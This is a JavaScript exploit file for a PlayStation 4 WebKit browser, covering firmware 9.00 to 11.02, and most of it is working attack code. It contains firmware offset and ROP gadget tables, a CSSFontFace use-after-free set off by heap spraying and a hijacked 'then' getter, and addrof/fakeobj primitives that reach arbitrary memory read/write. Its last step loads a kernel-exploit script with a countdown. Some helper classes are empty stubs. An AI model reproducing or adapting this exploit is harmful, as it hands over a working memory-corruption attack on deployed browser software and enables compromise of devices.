//================================================================================================
/* Copyright (C) 2025 anonymous

This file is part of CSSFontFace.

CSSFontFace is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

CSSFontFace is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
//================================================================================================
import "./dummy.js";

// General repo version to be shown
const exploit_version = "v1.1";

const version = {
  console: undefined,
  major: undefined,
  minor: undefined,
  init() {
    const ua = navigator.userAgent;
    const matches = ua.match(/PlayStation\s+(\d+)\/(\d+)\.(\d+)/);
    this.console = parseInt(matches[1], 10);
    this.major = parseInt(matches[2], 10);
    this.minor = parseInt(matches[3], 16);
    var psRegex = /PlayStation (4|5)[ \/]([0-9]{1,2}\.[0-9]{2})/;
    var match = ua.match(psRegex);
    if (match) {
      var device = match[1];    // "4" or "5"
      var fwVersion = match[2]; // "9.00", "9.03", etc.
      window.log("Detected FW: PS" + device + " v" + fwVersion + ", Exploit Version: " + exploit_version + "\n");
    }
  },
  toString() {}
};
//================================================================================================
const offset_map = {
  9: {
    0: {
      wk_CSSFontFace_sizeof: 0xb8,
      wk_CSSFontFace_m_families: 0x10,
      wk_CSSFontFace_m_featureSettings_m_buffer: 0x28,
      wk_CSSFontFace_m_featureSettings_m_size: 0x30,
      wk_CSSFontFace_m_featureSettings_m_capacity: 0x34,
      wk_CSSFontFace_m_clients: 0x60,
      wk_CSSFontFace_m_wrapper: 0x68,
      wk_CSSFontFace_m_status: 0x82,
      wk_CSSFontFace_m_thread: 0xa8,
      wk_FontFace_m_backing: 0x28,
      wk_TypedArray_flags: 0x1c,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x24,
      wk_RET: 0x2bf0769n,
      wk_LEAVE_RET: 0x220a168n,
      wk_POP_R8_RET: 0x1e262f8n,
      wk_POP_R9_RET: 0x12a7b96n,
      wk_POP_R10_RET: 0x125abffn,
      wk_POP_R11_RET: 0x1c33581n,
      wk_POP_R12_RET: 0x17c39e1n,
      wk_POP_R13_RET: 0x202adebn,
      wk_POP_R14_RET: 0x2105ec1n,
      wk_POP_R15_RET: 0x1c24b31n,
      wk_POP_RAX_RET: 0x1e67954n,
      wk_POP_RBP_RET: 0x685e6en,
      wk_POP_RBX_RET: 0x4d6758n,
      wk_POP_RCX_RET: 0x2c09fcdn,
      wk_POP_RDI_RET: 0x13c9c15n,
      wk_POP_RDX_RET: 0x155683bn,
      wk_POP_RSI_RET: 0x2bf0851n,
      wk_POP_RSP_RET: 0x685d81n,
      wk_MOV_RAX_RCX_RET: 0x2008fa0n,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x1eb1f1bn,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x16ba6f0n,
      wk_PUSH_RAX_POP_RBP_RET: 0x16d5cccn,
      wk_PUSH_RAX_PUSH_RBP_RET: 0x29ced40n,
      wk_PUSH_RBP_POP_RAX_RET: 0xb3b5d5n, // push rbp; rol ch, 0xfb; pop rax; ret;
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8: 0x143a842n,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x141d420n,
      wk_MOV_RSI_QWORD_PTR_RAX_10_CALL_QWORD_PTR_RAX_18: 0x1f0d7e0n,
      wk_PUSH_RSI_JMP_QWORD_PTR_RAX: 0x294c0e2n,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38: 0xf33be4n,
      wk_expm1_builtin: 0x1d23560n,
      wk___imp___error: 0x2f4a4d0,
      wk___imp_strerror: 0x2f4a520,
      k__error: 0xcb80n,
      c_strerror: 0x394f0n,
    },
    0x50: {
      wk_expm1_builtin: 0xd05b0n,
      wk___imp___error: 0x2f91ce0,
      wk___imp_strerror: 0x2f91d00,
      k__error: 0xbb60n,
      c_strerror: 0x357d0n,
    }
  },
  10: {
    0: {
      wk_CSSFontFace_m_clients: 0x58,
      wk_CSSFontFace_m_wrapper: 0x60,
      wk_CSSFontFace_m_status: 0x7a,
      wk_FontFace_m_backing: 0x30,
      wk_TypedArray_flags: 0x20,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x28,
      wk_expm1_builtin: 0x218bb70n,
      wk___imp___error: 0x36d1bf0,
      wk___imp_strerror: 0x36d1c20,
      k__error: 0x14f40n,
      c_strerror: 0x10d00n,
    },
    0x50: {
      wk_expm1_builtin: 0x218dcd0n,
      wk___imp___error: 0x36d5be8,
      wk___imp_strerror: 0x36d5c18,
      k__error: 0x1470n,
    }
  },
  11: {
    0: {
      wk_expm1_builtin: 0x2193f30n,
      wk___imp___error: 0x36e1c68,
      wk___imp_strerror: 0x36e1c98,
      k__error: 0x3370n,
    },
    2: {
      wk_expm1_builtin: 0x2193f40n,
    }
  }
}

const offsets = new Proxy(offset_map, {
  get(target, prop) {
    for (let major = version.major; major >= 0; major--) {
      if (major in target) {
        for (let minor = major === version.major ? version.minor : 0xFF; minor >= 0; minor--) {
          if (minor in target[major] && prop in target[major][minor]) {
            const value = target[major][minor][prop];
            if (value === null) {
              throw new Error(`${prop} offset is not supported for ${version}`);
            }
            return value;
          }
        }
      }
    }
    throw new Error(`${version} has no ${prop} !!`);
  }
});
//================================================================================================
const syscalls = new Map();
const structs = new Map();
const fn = {};
let timespec = undefined;
const spray_count = 0x80;
const spray_font_rule = `
  @font-face {
    font-family: spray;
    src: local(Helvetica Bold);
    unicode-range: U+0043;
  }
`;
const uaf_font_rule = `
  @font-face {
    font-family: b;
    src: url(nonexistent-font.woff);
    unicode-range: U+0042;
  }
`;
const helper = {
  dv: new DataView(new ArrayBuffer(8)),
  to_bigint(float) {
    this.dv.setFloat64(0, float, true);
    return this.dv.getBigUint64(0, true);
  },
  to_float(bigint) {
    this.dv.setUint32(0, Number(bigint.lo()), true);
    this.dv.setUint32(4, Number(bigint.htol()), true);
    return this.dv.getFloat64(0, true);
  }
};
const mem_tmp = {
  allocs: new Set(),
  alloc(len) {},
  free() {},
  free_all() {},
  copy(dst, src, len) {},
  bset() {},
  stob() {},
  btos() {},
  strlen() {}
};
window.arw = {
  leak: { obj: 0 },
  leak_addr: 0n,
  master: undefined,
  victim: new DataView(new ArrayBuffer(0x30)),
  view(addr) {
    if (addr === 0n) {
      throw new Error("Empty addr !!");
    }
    this.master[4] = Number(addr.lo());
    this.master[5] = Number(addr.htol());
    return this.victim;
  },
  addrof(obj) {
    this.leak.obj = obj;
    return this.view(this.leak_addr).getBigUint64(0x10, true);
  },
  fakeobj(addr) {
    this.view(this.leak_addr).setUint32(0x10, Number(addr.lo()), true);
    this.view(this.leak_addr).setUint32(0x14, Number(addr.htol()), true);
    return this.leak.obj;
  }
};
const rop = {
  stack: undefined,
  frame: undefined,
  pivot: undefined,
  insts: [],
  reset() {},
  execute() {}
};
const gadgets_tmp = new Proxy(offsets, {get(){}});
class SyscallError extends Error {constructor(){}}
class Stack {
  constructor() {}
  reset() {}
  get sp() {}
  prepare() {}
}
class Frame {
  constructor() {}
  reset() {}
  instof() {}
  addrof() {}
  get_value() {}
  set_value() {}
  valueof() {}
  store() {}
  load() {}
  pop() {}
}
class Pivot {
  constructor() {}
  get addr() {}
  prepare() {}
}
class NativeFunction {
  constructor() {}
  invoke() {}
  chain() {}
}
class Struct {
  constructor(name, fields) {
    if (structs.has(name)) {
      return structs.get(name);
    }
    if (!Array.isArray(fields)) {
      throw new Error("Input fields is not an array !!");
    }
    if (fields.length === 0) {
      throw new Error("Empty fields array !!");
    }
    let offset = 0;
    let alignof = 1;
    for (const field of fields) {
      field.size = Struct.type_size(field.type);
      field.align = Struct.type_align(field.type);
      field.offset = offset = offset.alignUp(field.align);
      field.count = field.count ?? 1;
      offset += field.size * field.count;
      alignof = Math.max(alignof, field.align);
    }
    this.name = name;
    this.fields = Object.fromEntries(fields.map((f) => [f.name, f]));
    this.sizeof = offset.alignUp(alignof);
    this.alignof = alignof;
    structs.set(this.name, this);
  }
  new(addr) {}
  static type_size(type) {}
  static type_align(type) {}
  static primitive_size(type) {}
}
BigInt.prototype.hi = function () {
  return this & ~0xffffffffn;
};
BigInt.prototype.lo = function () {
  return this & 0xffffffffn;
};
BigInt.prototype.htol = function () {
  return this.hi() >> 0x20n;
};
BigInt.prototype.hex = function (padded = true, maxLength = 16) {
  const value = this < 0n ? BigInt.asUintN(64, this) : this;
  let str = value.toString(16).toUpperCase();
  if (padded) {
    str = str.padStart(maxLength, "0");
  }
  return `0x${str}`;
};
BigInt.prototype.mask = function (bits, signed = false) {
  return signed ? BigInt.asIntN(bits, this) : BigInt.asUintN(bits, this);
};
BigInt.prototype.alignUp = function (alingment = 1n) {
  const mask = alingment - 1n;
  return (this + mask) & ~mask;
};
BigInt.prototype.alignDown = function (alingment = 1n) {
  const mask = alingment - 1n;
  return this & ~mask;
};
Number.prototype.hex = function (padded = false, maxLength = 16) {
  let str = this.toString(16).toUpperCase();
  if (padded) {
    str = str.padStart(maxLength, "0");
  }
  return `0x${str}`;
};
Number.prototype.alignUp = function (alignment) {
  const mask = alignment - 1;
  return (this + mask) & ~mask;
};
Number.prototype.alignDown = function (alignment) {
  const mask = alingment - 1;
  return this & ~mask;
};
DataView.prototype.getBigUint64 =
  DataView.prototype.getBigUint64 ||
  function (byteOffset, littleEndian) {
    const lo = this.getUint32(byteOffset, littleEndian);
    const hi = this.getUint32(byteOffset + 4, littleEndian);
    return BigInt.from(hi, lo);
  };
DataView.prototype.getBigInt64 =
  DataView.prototype.getBigInt64 ||
  function (byteOffset, littleEndian) {
    const lo = this.getUint32(littleEndian ? byteOffset : byteOffset + 4, littleEndian);
    const hi = this.getInt32(littleEndian ? byteOffset + 4 : byteOffset, littleEndian);
    return BigInt.from(hi, lo);
  };
DataView.prototype.setBigUint64 =
  DataView.prototype.setBigUint64 ||
  function (byteOffset, value, littleEndian) {
    const lo = Number(value.lo());
    const hi = Number(value.htol());
    this.setUint32(byteOffset, lo, littleEndian);
    this.setUint32(byteOffset + 4, hi, littleEndian);
  };
DataView.prototype.setBigInt64 =
  DataView.prototype.setBigInt64 ||
  function (byteOffset, value, littleEndian) {
    value = value.mask(64, true);
    const lo = Number(value.lo());
    const hi = Number(value.htol());
    if (littleEndian) {
      this.setUint32(byteOffset, lo, true);
      this.setInt32(byteOffset + 4, hi, true);
    } else {
      this.setInt32(byteOffset, hi, false);
      this.setUint32(byteOffset + 4, lo, false);
    }
  };
ArrayBuffer.prototype.data = function () {
  const ab_addr = arw.addrof(this);
  const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);
  return arw.view(m_impl).getBigUint64(0x10, true); // m_data
};
BigInt.from = function (hi, lo) {
  return (BigInt(hi) << 32n) | BigInt(lo);
};
//================================================================================================
async function init_arw() {
  //logger.info("Initiate UAF...");

  const abs = new Array(spray_count);

  // FontFace A with a local source so it resolves synchronously
  const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });

  document.fonts.add(A);

  // Register a DeferredPromise on A
  void A.loaded;

  const style = document.createElement("style");
  document.head.appendChild(style);

  // Shape heap around B in order to reclaim it after free
  for (let i = 0; i < spray_count / 4; i++) {
    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
  }

  // FontFace B with a remote source so it resolves asynchronously
  const uaf_font_rule_index = style.sheet.cssRules.length;
  style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);

  // Shape heap around B in order to reclaim it after free
  for (let i = spray_count / 4; i < spray_count; i++) {
    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
  }

  // Forces style recalculation and FontFace instantiation
  document.body.offsetTop;

  const old_then = FontFace.prototype.then;

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (this === A) {
        // Free B while FontFaceSet::load still holds a raw reference to it in matchingFaces
        style.sheet.deleteRule(0);

        // Forces style recalculation and FontFace deconstruction
        document.body.offsetTop;

        // Free B's neighbours
        for (let i = spray_count - 1; i > 0; i--) {
          if (i !== uaf_font_rule_index) {
            style.sheet.deleteRule(i);
          }
        }

        // Forces style recalculation and FontFace deconstruction
        document.body.offsetTop;

        // Spray ArrayBuffer with FontFace size and populate it so it survives crash
        for (let i = 0; i < abs.length; i++) {
          const ab = new ArrayBuffer(offsets.wk_CSSFontFace_sizeof);
          const view = new DataView(ab);

          view.setBigUint64(8, 1n, true); // ref count
          view.setUint8(offsets.wk_CSSFontFace_m_status, 3); // m_status: Status::Success

          abs[i] = ab;
        }
      }

      return undefined;
    }
  });

  // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule)
  // A resolves synchronously, firing the thenable check getter above
  const fonts = await document.fonts.load("1em a, b", "AB");

  //logger.debug(`fonts: ${fonts}`);

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    value: old_then,
  });

  // Check if both A and B are loaded
  if (fonts.length !== 2) {
    throw new Error("Unable to reclaim UAF FontFace !!");
  }

  //logger.info("UAF Achieved !!");
  window.log("CSSFontFace STAGE 1/3: UAF Achieved");

  // used to setup ARW
  const rw = {
    uaf_ab: undefined,
    uaf_font: undefined,
    oob_arr: undefined,
    obj_arr: undefined,
    leak: { obj: 0 },
    leak_addr: 0n,
    read(addr, size) {
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);

      let offset = 0;
      while (offset < size) {
        const ptr = addr + BigInt(offset);

        uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true); // m_featureSettings.m_buffer
        uaf_view.setInt32(offsets.wk_CSSFontFace_m_featureSettings_m_size, 1, true); // m_featureSettings.m_size
        uaf_view.setInt32(offsets.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true); // m_featureSettings.m_capacity

        // read m_tag since its std::array<char, 4> and skip the " chars
        for (let i = 1; i < 5; i++) {
          u8[offset++] = this.uaf_font.featureSettings.charCodeAt(i);
        }
      }

      return ab;
    },
    read8(addr) {
      const ab = this.read(addr, 8);
      const view = new DataView(ab);
      return view.getBigUint64(0, true);
    },
    addrof(obj) {
      rw.leak.obj = obj;
      return this.read8(this.leak_addr + 0x10n);
    },
    fakeobj(addr) {
      this.oob_arr[4] = helper.to_float(addr);
      return this.obj_arr[0];
    }
  };

  // UAF FontFace has default unicodeRange value U+0-10FFFF
  for (const font of fonts) {
    if (font.unicodeRange === "U+0-10FFFF") {
      //logger.info("Found UAF FontFace !!");
      window.log("CSSFontFace STAGE 2/3: Found UAF FontFace");
      rw.uaf_font = font;
      break;
    }
  }

  if (rw.uaf_font === undefined) {
    throw new Error("Unable to find UAF error !!");
  }

  fonts.length = 0;

  // UAF ArrayBuffer has ref count of 2 due to FontFace return to script
  for (const ab of abs) {
    const view = new DataView(ab);
    if (view.getBigUint64(8, true) === 2n) {
      //logger.info("Found ArrayBuffer of UAF FontFace !!");
      rw.uaf_ab = ab;
      break;
    }
  }

  if (rw.uaf_ab === undefined) {
    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
  }

  abs.length = 0;

  const uaf_view = new DataView(rw.uaf_ab);

  const m_clients = uaf_view.getBigUint64(offsets.wk_CSSFontFace_m_clients, true);
  const m_wrapper = uaf_view.getBigUint64(offsets.wk_CSSFontFace_m_wrapper, true);

  //logger.debug(`m_clients: ${m_clients.hex()}`);
  //logger.debug(`m_wrapper: ${m_wrapper.hex()}`);

  const m_wrapper_m_ptr = rw.read8(m_wrapper + 8n);
  //logger.debug(`m_wrapper_m_ptr: ${m_wrapper_m_ptr.hex()}`);

  const m_backing = rw.read8(m_wrapper_m_ptr + BigInt(offsets.wk_FontFace_m_backing));
  //logger.debug(`m_backing: ${m_backing.hex()}`);

  const props = [];
  const marker = 0xfffe000041414141n;

  // Spray marker and target JS object as props
  for (let i = 0; i < spray_count; i++) {
    props.push({ value: Number(marker.lo()) });
    props.push({ value: rw.leak });
  }

  let found = false;
  let start = m_backing.alignUp(0x4000n);
  while (true) {
    // Allocates Vector<PropertyDescriptor> and MarkedArgumentBuffer, both of which uses fastMalloc which will spray our props into fastMalloc heap
    Object.defineProperties({}, props);

    const dv = new DataView(rw.read(start, 0x100));

    for (let i = 0; i < dv.byteLength / 8; i += 8) {
      if (dv.getBigUint64(i, true) === marker) {
        const marker = start + BigInt(i * 8);
        //logger.info(`Found Array marker at ${marker.hex()} !!`);

        rw.leak_addr = rw.read8(marker + 0x20n);
        //logger.debug(`rw_leak_addr: ${rw.leak_addr.hex()}`);

        found = true;
        break;
      }
    }

    if (found) {
      break;
    }

    start += 0x100n;
  }

  window.log("CSSFontFace STAGE 3/3: Achieve Arbitrary Read/Write Primitive");
  const dummy_font = new FontFace("spray", "", {});
  const dummy_font_addr = rw.addrof(dummy_font);
  //logger.debug(`dummy_font_addr: ${dummy_font_addr.hex()}`);

  const font_addr = rw.read8(dummy_font_addr + 0x18n);
  //logger.debug(`font_addr: ${font_addr.hex()}`);

  const css_font_addr = rw.read8(font_addr + BigInt(offsets.wk_FontFace_m_backing));
  //logger.debug(`css_font_addr: ${css_font_addr.hex()}`);

  const m_thread = rw.read8(css_font_addr + BigInt(offsets.wk_CSSFontFace_m_thread));
  //logger.debug(`m_thread: ${m_thread.hex()}`);

  rw.oob_arr = new Array(1.1, 1.1);
  rw.obj_arr = new Array({}, {});

  const oob_arr_addr = rw.addrof(rw.oob_arr);
  //logger.debug(`oob_arr_addr: ${oob_arr_addr.hex()}`);
  
  const oob_arr_butterfly = rw.read8(oob_arr_addr + 8n);
  //logger.debug(`oob_arr_butterfly: ${oob_arr_butterfly.hex()}`);

  const oob_arr_indexing_header_addr = oob_arr_butterfly - 8n;
  //logger.debug(`oob_arr_indexing_header_addr: ${oob_arr_indexing_header_addr.hex()}`);

  const oob_arr_indexing_header_before = rw.read8(oob_arr_indexing_header_addr);
  //logger.debug(`oob_arr_indexing_header before: ${oob_arr_indexing_header_before.hex()}`);

  // Needed to survive crash from calling CSSFontFaceSet::add/CSSFontFaceSet::remove
  uaf_view.setUint8(offsets.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure

  document.fonts.add(rw.uaf_font);

  // Prepare UAF FontFace to be freed on CSSFontFaceSet::remove call, place oob_arr's indexing_header into m_families and m_wrapper so it deref by 1 then 2 and underflows
  uaf_view.setBigUint64(8, 1n, true); // ref count
  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_families, oob_arr_indexing_header_addr, true); // m_families
  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_featureSettings_m_buffer, 0n, true); // m_featureSettings.m_buffer
  uaf_view.setInt32(offsets.wk_CSSFontFace_m_featureSettings_m_size, 0, true); // m_featureSettings.m_size
  uaf_view.setInt32(offsets.wk_CSSFontFace_m_featureSettings_m_capacity, 0, true); // m_featureSettings.m_capacity
  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_clients, 0n, true); // m_clients
  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_wrapper, oob_arr_indexing_header_addr, true); // m_wrapper
  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_thread, m_thread, true); // m_thread

  document.fonts.delete(rw.uaf_font);

  // Restore UAF FontFace to be able to use rw.read again
  uaf_view.setBigUint64(8, 2n, true); // ref count
  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_clients, m_clients, true); // m_clients
  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_wrapper, m_wrapper, true); // m_wrapper
  uaf_view.setUint8(offsets.wk_CSSFontFace_m_status, 3); // m_status: Status::Success

  const oob_arr_indexing_header_after = rw.read8(oob_arr_indexing_header_addr);
  //logger.debug(`oob_arr_indexing_header after: ${oob_arr_indexing_header_after.hex()}`);

  if (oob_arr_indexing_header_before === oob_arr_indexing_header_after) {
    throw new Error("Unable to underflow oob_arr's indexing_header !!");
  }

  arw.leak_addr = rw.addrof(arw.leak);
  //logger.debug(`arw_leak_addr: ${arw.leak_addr.hex()}`);

  const dummy_view = new Uint32Array(1);
  const dummy_view_addr = rw.addrof(dummy_view);
  //logger.debug(`dummy_view_addr: ${dummy_view_addr.hex()}`);

  const dummy_view_jscell = rw.read8(dummy_view_addr);
  //logger.debug(`dummy_view_jscell: ${dummy_view_jscell.hex()}`);

  // Prepare container's properties to be used with fakeobj to create arw.master view over arw.victim DataView
  const container = {
    jscell: helper.to_float(dummy_view_jscell), // NaN-boxed, fix later
    butterfly: null, // becomes 0x2, fix later
    vector: arw.victim
  };

  if (version.major >= 10) {
    container.length = false; // becomes 0x6, fix later
    container.flags = null; // becomes 0x2, fix later
  } else {
    container.length_and_flags = false; // becomes 0x6, fix later
  }

  const container_addr = rw.addrof(container);
  //logger.debug(`container_addr: ${container_addr.hex()}`);

  const fake_addr = container_addr + 0x10n;
  //logger.debug(`fake_addr: ${fake_addr.hex()}`);

  const fake = rw.fakeobj(fake_addr);

  // Set victim's vector to fake_addr
  fake[4] = Number(fake_addr.lo());
  fake[5] = Number(fake_addr.htol());

  // Fix NaN-boxing values from earlier
  arw.victim.setBigUint64(0, dummy_view_jscell, true); // jscell
  arw.victim.setBigUint64(8, 0n, true); // butterfly

  // TypedArrayMode::OversizeTypedArray
  if (version.major >= 10) {
    arw.victim.setBigInt64(offsets.wk_TypedArray_flags, 1n, true); 
  } else {
    arw.victim.setUint32(offsets.wk_TypedArray_flags, 1, true);
  }

  // Create new view as TypedArrayMode::WastefulTypedArray using fake.buffer that points to arw.victim and no longer depends on container's lifetime
  arw.master = new Uint32Array(fake.buffer);

  const victim_addr = arw.addrof(arw.victim);
  //logger.debug(`victim_addr: ${victim_addr.hex()}`);

  // Set arw.victim's length to max
  if (version.major >= 10) {
    arw.view(victim_addr).setBigInt64(0x18, -1n, true);
  } else {
    arw.view(victim_addr).setInt32(0x18, -1, true);
  }

  // Cleanup container
  delete container.jscell;
  delete container.butterfly;
  delete container.vector;
  delete container.length_and_flags;

  window.entrypointCSSFontFace_result = 1;
  //logger.info("Achieved ARW !!");
  window.log("Achieved Arbitrary R/W\n", "green");
}
//================================================================================================
function init_structs() {
  timespec = new Struct("timespec", [
    { type: "Int64", name: "tv_sec" },
    { type: "Int64", name: "tv_nsec" },
  ]);
}
//================================================================================================
function getScript(source, callback) {
  var gs = document.createElement('script');
  gs.src = source;
  gs.async = false;
  gs.onload = callback;
  document.body.appendChild(gs);
}
//================================================================================================
var outputConsole = document.getElementById("console");
window.log = function (msg, color) {
  if (color === undefined) color = "#cccccc";
  outputConsole.innerHTML += '<span style="color:' + color + '">' + msg + '</span><br>';
};
//================================================================================================
async function doCSSFontFaceExploit() {
  version.init();
  window.log("Starting CSSFontFace Exploit by ntfargo & ufm42...", "#ffe600");
  window.entrypointCSSFontFace_result = 0;
  try {
    init_structs();
    await init_arw();
  } catch (e) {
    window.log(e.message,"red");
    window.log(e.stack,"red");
  }
  // Create UI
  document.title = "PS4 Jailbreak";
  document.body.style.backgroundColor = "#252526";
  document.body.style.color = "#cccccc";
  document.body.style.fontFamily = '"Segoe UI", Tahoma, sans-serif';
  document.body.style.textAlign = "center";
  const heading = document.createElement('h2');
  heading.textContent = 'CSSFontFace: A PS4 9.00 - 11.02 Exploit Chain';
  heading.style.marginBottom = '20px';
  document.body.insertBefore(heading, document.body.firstChild);
  const containerDiv = document.createElement('div');
  containerDiv.style.marginTop = '15px';
  const textSpan = document.createElement('span');
  textSpan.style.fontSize = '16px';
  textSpan.textContent = 'Autorun in ';
  const countdownSpan = document.createElement('span');
  countdownSpan.id = 'countdown';
  if (window.entrypointCSSFontFace_result === 1)
    countdownSpan.textContent = '5';
  else
    countdownSpan.textContent = '-';
  textSpan.appendChild(countdownSpan);
  textSpan.appendChild(document.createTextNode(' seconds'));
  containerDiv.appendChild(textSpan);
  const targetH2 = document.querySelector('h2');
  targetH2.insertAdjacentElement('afterend', containerDiv);
  // Console element settings
  const consoleElem = document.getElementById("console");
  if (consoleElem) {
    consoleElem.style.fontFamily = "monospace";
    consoleElem.style.backgroundColor = "#1e1e1e";
    consoleElem.style.color = "#cccccc";
    consoleElem.style.border = "1px solid #3c3c3c";
    consoleElem.style.padding = "12px";
    consoleElem.style.borderRadius = "6px";
    consoleElem.style.marginTop = "20px";
    consoleElem.style.textAlign = "left";
  }
  // Footer element settings
  const footer = document.createElement('footer');
  footer.style.marginTop = '20px';
  footer.style.fontSize = '14px';
  footer.style.color = '#888';
  footer.innerHTML = 'UI Designed by <strong>Feyzee</strong>';
  document.body.appendChild(footer);
  // Autorun timer setup
  let timeLeft = 5;
  window.log("Kernel exploit will start in 5 seconds...\n");
  const timer = setInterval(() => {
    if (window.entrypointCSSFontFace_result !== 1) {
      clearInterval(timer);
      countdownSpan.textContent = "-";
      return;
    }
    timeLeft--;
    countdownSpan.textContent = timeLeft;
    if (timeLeft <= 0) {
      clearInterval(timer);
      countdownSpan.textContent = "-";
      getScript('lapse.js', async function () { setTimeout(doJailBreak, 1000); });
    }
  }, 1000);
}
//================================================================================================
window.onload = async function() {
  if (window.applicationCache.status === 0) { // 0: UNCACHED
    window.location.replace("cache.html");
  } else {
    await doCSSFontFaceExploit();
  }
};
//================================================================================================
